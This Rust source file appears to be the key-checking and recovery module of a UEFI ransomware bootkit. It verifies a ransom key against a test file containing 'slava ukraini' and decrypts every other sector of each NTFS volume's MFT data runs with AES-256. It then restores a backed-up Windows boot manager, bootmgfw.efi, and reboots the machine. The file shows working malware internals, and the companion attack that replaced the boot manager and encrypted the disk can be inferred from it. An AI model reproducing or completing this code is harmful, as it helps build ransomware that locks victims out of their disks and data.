use aes::cipher::{generic_array::GenericArray, BlockDecrypt, NewBlockCipher};
use aes::{Aes256, Block};
use alloc::vec;
use alloc::vec::Vec;
use core::fmt::Write;
use core::ops::Range;
use uefi::proto::media::block::BlockIO;
use uefi::table::runtime::ResetType;
use uefi::table::{Boot, SystemTable};
use uefi::Status;

use crate::file::{read_file, write_file};
use crate::ntfs::{get_data_runs, read_mft_entry, OEM_ID};

fn read_test_file(st: &SystemTable<Boot>, key_bytes: &[u8; 32]) -> uefi::Result<bool> {
    let key = GenericArray::from_slice(key_bytes);
    let cipher = Aes256::new(key);

    let test_buf = read_file(st, "test")?;

    let mut block = Block::default();
    block.copy_from_slice(&test_buf);

    cipher.decrypt_block(&mut block);

    Ok(block.as_slice() == b"slava ukraini   ")
}

fn decrypt_data_run(
    blk: &mut BlockIO,
    media_id: u32,
    key_bytes: [u8; 32],
    range: Range<u64>,
) -> uefi::Result {
    let mut buf = [0u8; 512];
    let key = GenericArray::from_slice(&key_bytes);
    let cipher = Aes256::new(key);
    let mut blocks: Vec<Block> = vec![];

    for sector in range {
        if sector % 2 == 0 {
            blk.read_blocks(media_id, sector, &mut buf).unwrap();

            for chunk in buf.chunks(16) {
                let mut block = Block::default();
                block.copy_from_slice(chunk);
                blocks.push(block);
            }

            cipher.decrypt_blocks(&mut blocks);

            for (i, block) in blocks.iter().enumerate() {
                buf[16 * i..16 * i + 16].copy_from_slice(block.as_slice());
            }

            blocks.clear();

            blk.write_blocks(media_id, sector, &buf).unwrap();
        }
    }

    Ok(())
}

pub fn recover(st: &mut SystemTable<Boot>, key_bytes: &[u8]) -> uefi::Result {
    if key_bytes.len() != 64 {
        st.stdout().write_str("\nWrong key").unwrap();
        return Ok(());
    }

    let mut key = [0u8; 32];
    hex::decode_to_slice(key_bytes, &mut key).unwrap();

    if !read_test_file(st, &key)? {
        st.stdout().write_str("\nWrong key").unwrap();
        return Ok(());
    }

    st.stdout().enable_cursor(false)?;
    st.stdout().write_str("\nRight key !").unwrap();
    st.stdout().write_str("\nStart decrypting...").unwrap();

    // Get list of handles which instantiate a BlockIO
    let handles = st.boot_services().find_handles::<BlockIO>()?;
    for handle in handles {
        let blk = st.boot_services().handle_protocol::<BlockIO>(handle)?;
        let blk = unsafe { &mut *blk.get() };

        let blk_media = blk.media();
        let media_id = blk_media.media_id();

        let mut buf = [0u8; 512];
        blk.read_blocks(media_id, 0, &mut buf)?;

        if &buf[3..11] != OEM_ID {
            continue;
        }

        let mft_start = u64::from_ne_bytes(buf[48..56].try_into().unwrap()) * 8;
        let first_run_size = u64::from_ne_bytes(buf[72..80].try_into().unwrap());

        // Decrypt first data run
        decrypt_data_run(blk, media_id, key, mft_start..mft_start + first_run_size)?;

        let mut entry_buf = [0u8; 1024];
        read_mft_entry(blk, media_id, mft_start, &mut buf, &mut entry_buf).unwrap();

        let mut ranges = get_data_runs(&entry_buf)?;
        ranges.remove(0);

        for range in ranges {
            decrypt_data_run(blk, media_id, key, range)?;
        }
    }

    st.stdout().write_str("\nFinished !").unwrap();

    let windows_image = read_file(st, r"EFI\Microsoft\Boot\bootmgfw.efi.old")?;
    write_file(st, r"EFI\Microsoft\Boot\bootmgfw.efi", &windows_image)?;

    st.runtime_services()
        .reset(ResetType::Cold, Status::SUCCESS, Some(&[]));

    //Ok(())
}
